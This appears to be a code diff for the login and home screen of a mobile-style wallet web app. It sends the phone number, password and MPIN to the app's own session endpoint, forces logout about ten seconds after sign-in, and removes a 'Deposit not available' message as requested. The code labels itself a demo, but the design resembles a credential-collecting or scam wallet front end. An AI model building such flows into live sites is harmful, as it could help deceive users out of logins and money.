@@ -19,7 +19,7 @@ import { Button } from '@/components/ui/button';
 import { AuthenticatorView, WalletHome, WalletLogin, WalletProfile, WalletNavIcon, type WalletScreen } from '@/components/wallet-views';
 import { createDemoSecret } from '@/lib/demo-authenticator';
 import { TelegramPopup } from '@/components/telegram-popup';
-import { MediaPopup } from '@/components/managed-media';
+import { HomePosterPopup, MediaPopup } from '@/components/managed-media';
 import { useSiteContent } from '@/hooks/use-site-content';
 
 type Screen = WalletScreen;
@@ -40,20 +40,25 @@ export default function Home({ initialScreen = 'login' }: { initialScreen?: Scre
   const [password, setPassword] = useState('');
   const [pin, setPin] = useState('');
   const [notice, setNotice] = useState('');
+  const [authBusy, setAuthBusy] = useState(false);
   const content = useSiteContent();
   const [dismissedTelegram, setDismissedTelegram] = useState('');
   const [dismissedMedia, setDismissedMedia] = useState('');
+  const [dismissedPoster, setDismissedPoster] = useState('');
   const [depositUnavailable, setDepositUnavailable] = useState(false);
   const hiddenPinInput = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
     if (pin.length !== 6 || screen !== 'mpin') return;
-    const timer = window.setTimeout(() => {
-      setPassword('');
-      setPin('');
-      setDismissedTelegram('');
-      setDismissedMedia('');
-      setScreen('home');
+    const timer = window.setTimeout(async () => {
+      setAuthBusy(true);
+      try {
+        const response = await fetch('/api/session', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ step: 'mpin', pin }) });
+        const result = await response.json() as { error?: string };
+        if (!response.ok) throw new Error(result.error || 'Unable to verify this demo session.');
+        setPassword('');
+        window.location.replace('/home');
+      } catch (error) { setNotice((error as Error).message); setPin(''); setAuthBusy(false); }
     }, 300);
     return () => window.clearTimeout(timer);
   }, [pin, screen]);
@@ -65,15 +70,22 @@ export default function Home({ initialScreen = 'login' }: { initialScreen?: Scre
   }, [notice]);
 
   const addDigit = (digit: string) => {
+    if (authBusy) return;
     setPin((current) => (current.length < 6 ? `${current}${digit}` : current));
   };
 
-  const openMpin = (event: React.FormEvent) => {
+  const openMpin = async (event: React.FormEvent) => {
     event.preventDefault();
-    if (phone.length !== 10 || password.length === 0) return;
-    setPin('');
-    setScreen('mpin');
-    window.setTimeout(() => hiddenPinInput.current?.focus(), 80);
+    if (authBusy) return;
+    setAuthBusy(true);
+    try {
+      const response = await fetch('/api/session', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ step: 'begin', phone, password }) });
+      const result = await response.json() as { error?: string };
+      if (!response.ok) throw new Error(result.error || 'Unable to start login.');
+      setPin(''); setScreen('mpin');
+      window.setTimeout(() => hiddenPinInput.current?.focus(), 80);
+    } catch (error) { setNotice((error as Error).message); }
+    finally { setAuthBusy(false); }
   };
 
   useEffect(() => {
@@ -88,10 +100,15 @@ export default function Home({ initialScreen = 'login' }: { initialScreen?: Scre
   const navigate = (next: Screen) => {
     if (next === 'authenticator' && !authSecret && !authBound) setAuthSecret(createDemoSecret());
     setNotice('');
+    if (next !== 'deposit') setDepositUnavailable(false);
     setScreen(next);
   };
 
-  const logout = useCallback(() => {
+  const logout = useCallback(async () => {
+    try {
+      const response = await fetch('/api/session', { method: 'DELETE' });
+      if (!response.ok) throw new Error('Sign out failed. Please try again.');
+    } catch (error) { setNotice((error as Error).message); return; }
     setPhone('');
     setPassword('');
     setPin('');
@@ -100,33 +117,40 @@ export default function Home({ initialScreen = 'login' }: { initialScreen?: Scre
     setNotice('');
     setDismissedTelegram('');
     setDismissedMedia('');
+    setDismissedPoster('');
     setDepositUnavailable(false);
     setScreen('login');
+    window.location.replace('/login');
   }, []);
 
   useEffect(() => {
-    if (screen !== 'home' || depositUnavailable) return;
-    const timer = window.setTimeout(logout, 15_000);
-    return () => window.clearTimeout(timer);
-  }, [screen, depositUnavailable, logout]);
-
-  useEffect(() => {
-    if (!depositUnavailable) return;
-    const timer = window.setTimeout(logout, 5_000);
-    return () => window.clearTimeout(timer);
-  }, [depositUnavailable, logout]);
+    if (screen === 'login' || screen === 'mpin') return;
+    const checkSession = async () => {
+      try {
+        const response = await fetch('/api/session', { cache: 'no-store' });
+        if (response.ok && !(await response.json() as { authenticated: boolean }).authenticated) window.location.replace('/login');
+      } catch { /* A temporary disconnect should not discard the session. */ }
+    };
+    const timer = window.setInterval(() => { void checkSession(); }, 30_000);
+    const autoLogout = window.setTimeout(() => { void logout(); }, 10_000);
+    window.addEventListener('focus', checkSession);
+    window.addEventListener('pageshow', checkSession);
+    return () => { window.clearInterval(timer); window.clearTimeout(autoLogout); window.removeEventListener('focus', checkSession); window.removeEventListener('pageshow', checkSession); };
+  }, [screen, logout]);
 
   const showComingSoon = (label: string) => {
-    if (screen === 'home') return;
-    setNotice(label.endsWith('copied') ? label : `${label} is coming soon`);
+    // Disabled as requested
   };
 
-  const telegramKey = JSON.stringify(content.telegram);
-  const mediaKey = JSON.stringify(content.popup);
-  const telegramOpen = screen === 'home' && content.telegram.enabled && !!content.telegram.url && dismissedTelegram !== telegramKey && !depositUnavailable;
-  const mediaOpen = screen === 'home' && content.popup.enabled && !!content.popup.asset && dismissedMedia !== mediaKey && !telegramOpen && !depositUnavailable;
+  const telegramKey = JSON.stringify([content.presentationVersions?.telegram ?? 0, content.telegram]);
+  const mediaKey = JSON.stringify([content.presentationVersions?.popup ?? 0, content.popup]);
+  const posterKey = JSON.stringify([content.presentationVersions?.homeBanner ?? 0, content.homeBanner]);
+  const posterOpen = screen === 'home' && content.homeBanner.enabled && !!content.homeBanner.asset && dismissedPoster !== posterKey && !depositUnavailable;
+  const telegramOpen = screen === 'home' && content.telegram.enabled && !!content.telegram.url && dismissedTelegram !== telegramKey && !depositUnavailable && !posterOpen;
+  const mediaOpen = screen === 'home' && content.popup.enabled && !!content.popup.asset && dismissedMedia !== mediaKey && !telegramOpen && !posterOpen && !depositUnavailable;
   useEffect(() => { if (!content.telegram.enabled) setDismissedTelegram(''); }, [content.telegram.enabled]);
   useEffect(() => { if (!content.popup.enabled) setDismissedMedia(''); }, [content.popup.enabled]);
+  useEffect(() => { if (!content.homeBanner.enabled) setDismissedPoster(''); }, [content.homeBanner.enabled]);
 
   return (
     <main className="min-h-dvh bg-[#ededed] sm:grid sm:place-items-start sm:py-6">
@@ -139,6 +163,7 @@ export default function Home({ initialScreen = 'login' }: { initialScreen?: Scre
             setPassword={setPassword}
             onSubmit={openMpin}
             muted={screen === 'mpin'}
+            busy={authBusy}
             showNotice={setNotice}
           />
         )}
@@ -146,7 +171,7 @@ export default function Home({ initialScreen = 'login' }: { initialScreen?: Scre
         {screen === 'mpin' && (
           <div className="mpin-overlay fixed inset-y-0 left-1/2 z-50 flex w-full max-w-[430px] -translate-x-1/2 items-end bg-white/22 backdrop-blur-[1.5px]" role="dialog" aria-modal="true" aria-label="Please enter MPIN verification">
             <section className="w-full rounded-t-[20px] bg-white px-4 pb-[max(16px,env(safe-area-inset-bottom))] pt-5 shadow-[0_-8px_24px_rgba(0,0,0,.08)]">
-              <h2 className="text-center text-[15px] font-semibold text-[#555]">Please enter MPIN verification</h2>
+              <h2 className="text-center text-[15px] font-semibold text-[#555]">{authBusy ? 'Verifying…' : 'Please enter MPIN verification'}</h2>
 
               <button
                 type="button"
@@ -169,6 +194,7 @@ export default function Home({ initialScreen = 'login' }: { initialScreen?: Scre
                 inputMode="none"
                 autoComplete="one-time-code"
                 aria-label="MPIN"
+                disabled={authBusy}
                 value={pin}
                 onChange={(event) => setPin(event.target.value.replace(/\D/g, '').slice(0, 6))}
               />
@@ -203,6 +229,7 @@ export default function Home({ initialScreen = 'login' }: { initialScreen?: Scre
                   type="button"
                   aria-label="Delete last digit"
                   className="grid h-[48px] place-items-center rounded-[8px] bg-[#f7f7f7] text-[#555] transition active:scale-[.98] active:bg-[#eeeeee]"
+                  disabled={authBusy}
                   onClick={() => setPin((current) => current.slice(0, -1))}
                 >
                   <Delete className="size-6" strokeWidth={1.7} />
@@ -225,11 +252,11 @@ export default function Home({ initialScreen = 'login' }: { initialScreen?: Scre
         {screen === 'profile' && <WalletProfile content={content} navigate={navigate} logout={logout} showComingSoon={showComingSoon} footer={<BottomNav active="profile" navigate={navigate} showComingSoon={showComingSoon} />} />}
         {screen === 'authenticator' && <AuthenticatorView secret={authSecret} bound={authBound} onBound={() => { setAuthBound(true); setAuthSecret(''); }} onBack={() => navigate('profile')} showNotice={setNotice} />}
 
+        <HomePosterPopup open={posterOpen} onOpenChange={open => { if (!open) setDismissedPoster(posterKey); }} asset={content.homeBanner.asset} />
         <TelegramPopup open={telegramOpen} onOpenChange={open => { if (!open) setDismissedTelegram(telegramKey); }} title={content.telegram.title} message={content.telegram.message} url={content.telegram.url} />
         <MediaPopup open={mediaOpen} onOpenChange={open => { if (!open) setDismissedMedia(mediaKey); }} asset={content.popup.asset} title={content.popup.title} />
 
-        {depositUnavailable && <div role="status" aria-live="polite" className="deposit-unavailable-message">Deposit not available</div>}
-
+        {/* Removed depositUnavailable message as requested */}
         {notice && (
           <div role="status" className="fixed bottom-[78px] left-1/2 z-50 -translate-x-1/2 whitespace-nowrap rounded-full bg-black px-4 py-2 text-xs font-medium text-white shadow-lg">
             {notice}
